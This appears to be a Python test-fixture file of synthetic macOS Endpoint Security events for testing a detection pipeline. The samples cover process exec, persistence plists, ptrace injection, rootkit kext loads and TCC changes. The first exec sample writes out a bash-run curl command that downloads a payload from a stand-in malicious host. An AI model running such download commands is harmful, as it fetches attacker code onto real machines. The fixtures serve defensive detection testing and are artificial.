"""
Test fixtures: Sample ESF events for testing the coreSigma pipeline.

These fixtures represent real ESF event structures from eslogger output.
"""

# =============================================================================
# EXEC EVENT (event_type: 9) - Process Creation
# =============================================================================
SAMPLE_EXEC_EVENT = {
    "event_type": 9,
    "time": "2025-01-15T10:30:00.000Z",
    "process": {
        "audit_token": {
            "pid": 12345,
            "euid": 501,
            "egid": 20,
            "ruid": 501,
            "rgid": 20,
            "svuid": 501,
            "svgid": 20
        },
        "ppid": 1,
        "executable": {
            "path": "/usr/bin/curl"
        },
        "args": ["curl", "-o", "/tmp/payload.sh", "https://malicious.com/payload.sh"],
        "signing_id": "com.apple.curl",
        "team_id": "",
        "cwd": {
            "path": "/Users/victim"
        },
        "parent": {
            "executable": {
                "path": "/bin/bash"
            },
            "args": ["bash", "-c", "curl -o /tmp/payload.sh https://malicious.com/payload.sh"]
        }
    },
    "event": {
        "exec": {
            "args": ["curl", "-o", "/tmp/payload.sh", "https://malicious.com/payload.sh"],
            "cwd": {
                "path": "/Users/victim"
            },
            "target": {
                "executable": {
                    "path": "/usr/bin/curl"
                }
            }
        }
    }
}

SAMPLE_EXEC_EVENT_SUSPICIOUS_PATH = {
    "event_type": 9,
    "time": "2025-01-15T10:31:00.000Z",
    "process": {
        "audit_token": {
            "pid": 12346,
            "euid": 501,
            "egid": 20,
            "ruid": 501,
            "rgid": 20
        },
        "ppid": 12345,
        "executable": {
            "path": "/tmp/malware"
        },
        "args": ["/tmp/malware", "--connect", "192.168.1.100"],
        "signing_id": "",
        "team_id": ""
    },
    "event": {
        "exec": {
            "args": ["/tmp/malware", "--connect", "192.168.1.100"],
            "target": {
                "executable": {
                    "path": "/tmp/malware"
                }
            }
        }
    }
}

# =============================================================================
# CREATE EVENT (event_type: 13) - File Creation
# =============================================================================
SAMPLE_CREATE_EVENT = {
    "event_type": 13,
    "time": "2025-01-15T10:32:00.000Z",
    "process": {
        "audit_token": {
            "pid": 12345,
            "euid": 501,
            "egid": 20,
            "ruid": 501,
            "rgid": 20
        },
        "ppid": 1,
        "executable": {
            "path": "/usr/bin/curl"
        },
        "signing_id": "com.apple.curl",
        "team_id": ""
    },
    "event": {
        "target": {
            "file": {
                "path": "/Library/LaunchAgents/com.malware.plist"
            }
        }
    }
}

SAMPLE_CREATE_EVENT_LAUNCH_DAEMON = {
    "event_type": 13,
    "time": "2025-01-15T10:33:00.000Z",
    "process": {
        "audit_token": {
            "pid": 99999,
            "euid": 0,
            "egid": 0,
            "ruid": 0,
            "rgid": 0
        },
        "ppid": 1,
        "executable": {
            "path": "/bin/bash"
        },
        "signing_id": "com.apple.bash",
        "team_id": ""
    },
    "event": {
        "target": {
            "file": {
                "path": "/Library/LaunchDaemons/com.persistence.plist"
            }
        }
    }
}

# =============================================================================
# UNLINK EVENT (event_type: 19) - File Deletion
# =============================================================================
SAMPLE_UNLINK_EVENT = {
    "event_type": 19,
    "time": "2025-01-15T10:34:00.000Z",
    "process": {
        "audit_token": {
            "pid": 12347,
            "euid": 0,
            "egid": 0,
            "ruid": 0,
            "rgid": 0
        },
        "ppid": 1,
        "executable": {
            "path": "/bin/rm"
        },
        "signing_id": "com.apple.rm",
        "team_id": ""
    },
    "event": {
        "target": {
            "file": {
                "path": "/private/etc/sudoers.d/custom"
            }
        }
    }
}

# =============================================================================
# RENAME EVENT (event_type: 21) - File Rename
# =============================================================================
SAMPLE_RENAME_EVENT = {
    "event_type": 21,
    "time": "2025-01-15T10:35:00.000Z",
    "process": {
        "audit_token": {
            "pid": 12348,
            "euid": 501,
            "egid": 20,
            "ruid": 501,
            "rgid": 20
        },
        "ppid": 1,
        "executable": {
            "path": "/bin/mv"
        },
        "signing_id": "com.apple.mv",
        "team_id": ""
    },
    "event": {
        "source": {
            "file": {
                "path": "/tmp/malware.tmp"
            }
        },
        "destination": {
            "path": "/Users/victim/.hidden_malware"
        }
    }
}

# =============================================================================
# SETUID EVENT (event_type: 24) - Privilege Escalation
# =============================================================================
SAMPLE_SETUID_EVENT = {
    "event_type": 24,
    "time": "2025-01-15T10:36:00.000Z",
    "process": {
        "audit_token": {
            "pid": 12349,
            "euid": 501,
            "egid": 20,
            "ruid": 501,
            "rgid": 20
        },
        "ppid": 1,
        "executable": {
            "path": "/usr/bin/sudo"
        },
        "signing_id": "com.apple.sudo",
        "team_id": ""
    },
    "event": {
        "setuid": {
            "uid": 0
        }
    }
}

# =============================================================================
# SETGID EVENT (event_type: 25) - Group Change
# =============================================================================
SAMPLE_SETGID_EVENT = {
    "event_type": 25,
    "time": "2025-01-15T10:37:00.000Z",
    "process": {
        "audit_token": {
            "pid": 12350,
            "euid": 501,
            "egid": 20,
            "ruid": 501,
            "rgid": 20
        },
        "ppid": 1,
        "executable": {
            "path": "/usr/bin/newgrp"
        },
        "signing_id": "com.apple.newgrp",
        "team_id": ""
    },
    "event": {
        "setgid": {
            "gid": 0
        }
    }
}

# =============================================================================
# SIGNAL EVENT (event_type: 27) - Process Signal
# =============================================================================
SAMPLE_SIGNAL_EVENT = {
    "event_type": 27,
    "time": "2025-01-15T10:38:00.000Z",
    "process": {
        "audit_token": {
            "pid": 12351,
            "euid": 0,
            "egid": 0,
            "ruid": 0,
            "rgid": 0
        },
        "ppid": 1,
        "executable": {
            "path": "/bin/kill"
        },
        "signing_id": "com.apple.kill",
        "team_id": ""
    },
    "event": {
        "signal": {
            "sig": 9,
            "target": {
                "process": {
                    "pid": 99,
                    "executable": {
                        "path": "/usr/libexec/xpcproxy"
                    }
                }
            }
        }
    }
}

# =============================================================================
# PTRACE EVENT (event_type: 64) - Process Injection
# =============================================================================
SAMPLE_PTRACE_EVENT = {
    "event_type": 64,
    "time": "2025-01-15T10:39:00.000Z",
    "process": {
        "audit_token": {
            "pid": 12352,
            "euid": 0,
            "egid": 0,
            "ruid": 0,
            "rgid": 0
        },
        "ppid": 1,
        "executable": {
            "path": "/tmp/injector"
        },
        "signing_id": "",
        "team_id": ""
    },
    "event": {
        "ptrace": {
            "request": 31,
            "target": {
                "process": {
                    "pid": 500,
                    "executable": {
                        "path": "/Applications/Safari.app/Contents/MacOS/Safari"
                    }
                },
                "audit_token": {
                    "pid": 500
                }
            }
        }
    }
}

# =============================================================================
# KEXTLOAD EVENT (event_type: 17) - Kernel Extension Load
# =============================================================================
SAMPLE_KEXTLOAD_EVENT = {
    "event_type": 17,
    "time": "2025-01-15T10:40:00.000Z",
    "process": {
        "audit_token": {
            "pid": 1,
            "euid": 0,
            "egid": 0,
            "ruid": 0,
            "rgid": 0
        },
        "ppid": 0,
        "executable": {
            "path": "/sbin/kextload"
        },
        "signing_id": "com.apple.kextload",
        "team_id": ""
    },
    "event": {
        "kextload": {
            "kext": {
                "identifier": "com.suspicious.rootkit",
                "path": "/tmp/rootkit.kext",
                "team_id": ""
            }
        }
    }
}

# =============================================================================
# XPC_CONNECT EVENT (event_type: 65) - XPC Connection
# =============================================================================
SAMPLE_XPC_CONNECT_EVENT = {
    "event_type": 65,
    "time": "2025-01-15T10:41:00.000Z",
    "process": {
        "audit_token": {
            "pid": 12353,
            "euid": 501,
            "egid": 20,
            "ruid": 501,
            "rgid": 20
        },
        "ppid": 1,
        "executable": {
            "path": "/tmp/malware"
        },
        "signing_id": "",
        "team_id": ""
    },
    "event": {
        "xpc": {
            "service_name": "com.apple.security.authhost"
        }
    }
}

# =============================================================================
# MPROTECT EVENT (event_type: 20) - Memory Protection Change
# =============================================================================
SAMPLE_MPROTECT_EVENT = {
    "event_type": 20,
    "time": "2025-01-15T10:42:00.000Z",
    "process": {
        "audit_token": {
            "pid": 12354,
            "euid": 501,
            "egid": 20,
            "ruid": 501,
            "rgid": 20
        },
        "ppid": 1,
        "executable": {
            "path": "/tmp/shellcode_loader"
        },
        "signing_id": "",
        "team_id": ""
    },
    "event": {
        "mprotect": {
            "protection": 7
        }
    }
}

# =============================================================================
# AUTHENTICATION EVENT (event_type: 111) - Authentication
# =============================================================================
SAMPLE_AUTH_SUCCESS_EVENT = {
    "event_type": 111,
    "time": "2025-01-15T10:43:00.000Z",
    "process": {
        "audit_token": {
            "pid": 12355,
            "euid": 0,
            "egid": 0,
            "ruid": 0,
            "rgid": 0
        },
        "ppid": 1,
        "executable": {
            "path": "/usr/libexec/securityd"
        },
        "signing_id": "com.apple.securityd",
        "team_id": ""
    },
    "event": {
        "authentication": {
            "success": True,
            "type": "password"
        }
    }
}

SAMPLE_AUTH_FAILURE_EVENT = {
    "event_type": 111,
    "time": "2025-01-15T10:44:00.000Z",
    "process": {
        "audit_token": {
            "pid": 12356,
            "euid": 0,
            "egid": 0,
            "ruid": 0,
            "rgid": 0
        },
        "ppid": 1,
        "executable": {
            "path": "/usr/libexec/securityd"
        },
        "signing_id": "com.apple.securityd",
        "team_id": ""
    },
    "event": {
        "authentication": {
            "success": False,
            "type": "password"
        }
    }
}

# =============================================================================
# MOUNT EVENT (event_type: 22) - File System Mount
# =============================================================================
SAMPLE_MOUNT_EVENT = {
    "event_type": 22,
    "time": "2025-01-15T10:45:00.000Z",
    "process": {
        "audit_token": {
            "pid": 12357,
            "euid": 0,
            "egid": 0,
            "ruid": 0,
            "rgid": 0
        },
        "ppid": 1,
        "executable": {
            "path": "/sbin/mount"
        },
        "signing_id": "com.apple.mount",
        "team_id": ""
    },
    "event": {
        "mount": {
            "statfs": {
                "f_mntonname": "/Volumes/UntrustedUSB",
                "f_fstypename": "msdos"
            }
        }
    }
}

# =============================================================================
# TCC_MODIFY EVENT (event_type: 147) - TCC Database Modification
# =============================================================================
SAMPLE_TCC_MODIFY_EVENT = {
    "event_type": 147,
    "time": "2025-01-15T10:46:00.000Z",
    "process": {
        "audit_token": {
            "pid": 12358,
            "euid": 0,
            "egid": 0,
            "ruid": 0,
            "rgid": 0
        },
        "ppid": 1,
        "executable": {
            "path": "/tmp/tcc_bypass"
        },
        "signing_id": "",
        "team_id": ""
    },
    "event": {
        "tcc_modify": {
            "service": "kTCCServiceScreenCapture",
            "client": "com.malware.app"
        }
    }
}

# =============================================================================
# COLLECTION OF ALL EVENTS BY CATEGORY
# =============================================================================
ALL_PROCESS_EVENTS = [
    SAMPLE_EXEC_EVENT,
    SAMPLE_EXEC_EVENT_SUSPICIOUS_PATH,
]

ALL_FILE_EVENTS = [
    SAMPLE_CREATE_EVENT,
    SAMPLE_CREATE_EVENT_LAUNCH_DAEMON,
    SAMPLE_UNLINK_EVENT,
    SAMPLE_RENAME_EVENT,
]

ALL_PRIVILEGE_EVENTS = [
    SAMPLE_SETUID_EVENT,
    SAMPLE_SETGID_EVENT,
]

ALL_INJECTION_EVENTS = [
    SAMPLE_PTRACE_EVENT,
    SAMPLE_SIGNAL_EVENT,
]

ALL_KERNEL_EVENTS = [
    SAMPLE_KEXTLOAD_EVENT,
]

ALL_SECURITY_EVENTS = [
    SAMPLE_AUTH_SUCCESS_EVENT,
    SAMPLE_AUTH_FAILURE_EVENT,
    SAMPLE_TCC_MODIFY_EVENT,
]

ALL_SAMPLE_EVENTS = (
    ALL_PROCESS_EVENTS +
    ALL_FILE_EVENTS +
    ALL_PRIVILEGE_EVENTS +
    ALL_INJECTION_EVENTS +
    ALL_KERNEL_EVENTS +
    ALL_SECURITY_EVENTS +
    [SAMPLE_XPC_CONNECT_EVENT, SAMPLE_MPROTECT_EVENT, SAMPLE_MOUNT_EVENT]
)
